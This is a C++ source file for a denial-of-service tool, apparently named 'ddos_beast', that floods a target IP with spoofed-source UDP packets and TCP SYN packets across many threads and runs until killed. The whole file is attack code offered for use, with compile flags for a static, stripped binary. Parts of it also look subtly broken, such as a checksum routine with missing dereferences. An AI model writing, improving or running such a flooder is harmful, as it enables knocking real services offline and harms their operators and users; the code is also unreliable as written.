// ddos_beast.cpp — compile with: g++ -O3 -march=native -pthread -static -s ddos_beast.cpp -o beast
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <random>
#include <cstring>
#include <atomic>

std::atomic<bool> running{true};const char* target_ip;
uint16_t target_port = 80;
std::mt19937 rng{std::random_device{}()};

unsigned short checksum(void* buf, size_t len) {
    unsigned long sum = 0;
    unsigned short* p = (unsigned short*)buf;
    while (len > 1) { sum +=p++; len -= 2;}
    if (len) sum +=(unsigned char*)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (unsigned short)~sum;
}

void* udp_flood(void*) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int on = 1; setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    char packet[4096];
    struct iphdr* ip = (struct iphdr*)packet;
    struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    char* data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    memset(packet, 0, sizeof(packet));
    ip->ihl = 5; ip->version = 4;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 1024);
    ip->id = htonl(rng() & 0xffff); ip->ttl = 64; ip->protocol = IPPROTO_UDP;
    ip->check = 0; ip->saddr = rng(); ip->daddr = inet_addr(target_ip);
    udp->source = htons(rng() & 0xffff);
    udp->dest = htons(target_port);
    udp->len = htons(sizeof(struct udphdr) + 1024);
    memset(data, 'X', 1024);
    sockaddr_in dest; dest.sin_family = AF_INET; dest.sin_addr.s_addr = ip->daddr;

    while (running) {
        ip->saddr = rng();
        udp->source = htons(rng() & 0xffff);
        ip->check = checksum(ip, sizeof(struct iphdr));
        udp->check = 0;
        sendto(sock, packet, ntohs(ip->tot_len), 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    return nullptr;
}

void* syn_flood(void*) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int on = 1; setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    char packet[4096];
    struct iphdr* ip = (struct iphdr*)packet;
    struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    ip->ihl = 5; ip->version = 4;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->ttl = 64; ip->protocol = IPPROTO_TCP; ip->daddr = inet_addr(target_ip);
    tcp->dest = htons(target_port); tcp->syn = 1; tcp->window = htons(65535); tcp->doff = 5;

    while (running) {
        ip->saddr = rng(); ip->id = htons(rng() & 0xffff);
        tcp->source = htons(rng() & 0xffff);
        tcp->seq = htonl(rng());
        ip->check = checksum(ip, ip->tot_len);
        tcp->check = 0;
        sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = tcp->dest; sin.sin_addr.s_addr = ip->daddr;
        sendto(sock, packet, ntohs(ip->tot_len), 0, (struct sockaddr*)&sin, sizeof(sin));
    }
    return nullptr;
}

int main(int argc, char** argv) {
    if (argc!=3) {
        printf("Usage: %s <target_ip> <threads>\n", argv[0]);
        return 1;
    }
    target_ip = argv[1];
    int threads = atoi(argv[2]);
    printf("Beast unleashed on %s with %d threads...\n", target_ip, threads);
    for (int i = 0; i < threads / 2; i++) {
        pthread_t t1, t2;
        pthread_create(&t1, nullptr, udp_flood, nullptr);
        pthread_create(&t2, nullptr, syn_flood, nullptr);
    }
    while (running) sleep(3600); // runs forever
    return 0;
}
